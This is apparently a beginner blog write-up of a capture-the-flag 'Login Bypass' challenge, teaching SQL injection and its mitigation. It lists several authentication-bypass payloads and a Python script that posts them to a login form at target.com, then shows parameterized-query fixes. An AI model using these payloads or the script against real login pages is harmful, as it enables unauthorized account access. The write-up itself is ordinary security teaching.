---
title: 'Web Exploitation Basics: SQL Injection'
description: 'A beginner-friendly walkthrough of SQL injection vulnerabilities in web applications, covering detection, exploitation, and mitigation techniques.'
date: 2025-01-20
tags: ['web', 'sql-injection', 'security', 'beginner']
authors: ['keruenn']
draft: false
---

# Web Exploitation Basics: SQL Injection

This writeup covers the fundamentals of SQL injection attacks, one of the most common web application vulnerabilities.

## Challenge Overview

**Challenge Name:** Login Bypass  
**Category:** Web Security  
**Difficulty:** Easy  
**Points:** 50

## Description

You're presented with a login form that appears to be vulnerable to SQL injection. The goal is to bypass authentication and gain access to the admin panel.

## Reconnaissance

First, let's examine the login form:

```html
<form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
</form>
```

## Analysis

The application likely uses a SQL query like this:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

This is vulnerable to SQL injection because user input is directly concatenated into the query.

## Exploitation

### Step 1: Basic SQL Injection

Let's try a classic SQL injection payload:

**Username:** `admin'--`  
**Password:** `anything`

This transforms the query to:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

The `--` comments out the password check, allowing us to login as admin.

### Step 2: Alternative Payloads

Other effective payloads include:

```sql
admin' OR '1'='1'--
admin' OR 1=1#
admin' UNION SELECT 1,1,1--
```

### Step 3: Automated Testing

Here's a Python script to test multiple payloads:

```python
import requests

payloads = [
    "admin'--",
    "admin' OR '1'='1'--",
    "admin' OR 1=1#",
    "' OR '1'='1'--",
    "' OR 1=1#"
]

for payload in payloads:
    data = {
        'username': payload,
        'password': 'test'
    }
    response = requests.post('http://target.com/login', data=data)
    if 'welcome' in response.text.lower():
        print(f"Success with payload: {payload}")
        break
```

## Flag

`flag{sql_injection_is_easy_but_dangerous}`

## Key Takeaways

1. **Never trust user input** - Always validate and sanitize
2. **Use parameterized queries** - Prepared statements prevent SQL injection
3. **Input validation** - Implement proper input validation and filtering
4. **Error handling** - Don't expose database errors to users

## Mitigation

### Secure Code Example

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# Secure code using parameterized queries
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

### Additional Security Measures

- Use ORM (Object-Relational Mapping) frameworks
- Implement input validation and sanitization
- Apply the principle of least privilege
- Regular security testing and code reviews

## References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Tutorial](https://portswigger.net/web-security/sql-injection)
- [SQLMap Tool Documentation](https://sqlmap.org/)
